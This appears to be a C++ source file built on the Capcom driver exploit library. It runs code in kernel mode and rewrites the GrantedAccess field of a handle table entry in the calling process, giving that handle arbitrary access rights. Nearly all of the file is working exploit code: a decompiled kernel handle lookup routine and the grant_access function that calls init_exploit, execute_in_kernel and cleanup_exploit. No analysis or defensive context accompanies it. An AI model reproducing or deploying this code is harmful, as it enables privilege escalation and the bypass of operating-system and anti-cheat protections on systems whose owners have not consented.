#include "structs.h"
#include "kerneloffsets.h"
#include "libcapcom.h"

using namespace native::structs;

PHANDLE_TABLE_ENTRY ExpLookupHandleTableEntry(PHANDLE_TABLE pHandleTable, HANDLE handle)
{
	unsigned __int64 v2; // rdx
	__int64 v3; // r8
	signed __int64 v4; // rax
	__int64 v5; // rax

	v2 = (__int64)handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(DWORD*)pHandleTable)
		return 0i64;
	v3 = *((uintptr_t*)pHandleTable + 1);
	v4 = *((uintptr_t *)pHandleTable + 1) & 3i64;
	if ((uint32_t)v4 == 1)
	{
		v5 = *(uintptr_t*)(v3 + 8 * (v2 >> 10) - 1);
		return (PHANDLE_TABLE_ENTRY)(v5 + 4 * (v2 & 0x3FF));
	}
	if ((uint32_t)v4)
	{
		v5 = *(uintptr_t*)(*(uintptr_t *)(v3 + 8 * (v2 >> 19) - 2) + 8 * ((v2 >> 10) & 0x1FF));
		return (PHANDLE_TABLE_ENTRY)(v5 + 4 * (v2 & 0x3FF));
	}
	return (PHANDLE_TABLE_ENTRY)(v3 + 4 * v2);
}

bool grant_access(HANDLE handle, ACCESS_MASK access)
{
	if (!init_exploit()) return false;

	kernel_offsets::init();

	execute_in_kernel([&handle, &access](MmGetSystemRoutineAddress_t _MmGetSystemRoutineAddress)
	{
		UNICODE_STRING DbgPrintExName = { 0 };
		RtlInitUnicodeString(&DbgPrintExName, L"DbgPrintEx");

		UNICODE_STRING PsGetCurrentProcessName = { 0 };
		RtlInitUnicodeString(&PsGetCurrentProcessName, L"PsGetCurrentProcess");

		DbgPrintEx_t _DbgPrintEx = (DbgPrintEx_t)_MmGetSystemRoutineAddress(&DbgPrintExName);
		PsGetCurrentProcess_t _PsGetCurrentProcess = (PsGetCurrentProcess_t)_MmGetSystemRoutineAddress(&PsGetCurrentProcessName);

		void* pEProcess = _PsGetCurrentProcess();
		PHANDLE_TABLE pHandleTable = *(PHANDLE_TABLE*)((unsigned char*)pEProcess + kernel_offsets::objecttable);

		PHANDLE_TABLE_ENTRY pEntry = ExpLookupHandleTableEntry(pHandleTable, handle);
		ACCESS_MASK oldAccess = pEntry->GrantedAccess;
		pEntry->GrantedAccess = access;

		_DbgPrintEx(77, 0, "Old: 0x%llx -> New: 0x%llx", oldAccess, pEntry->GrantedAccess);
	});

	return cleanup_exploit();
}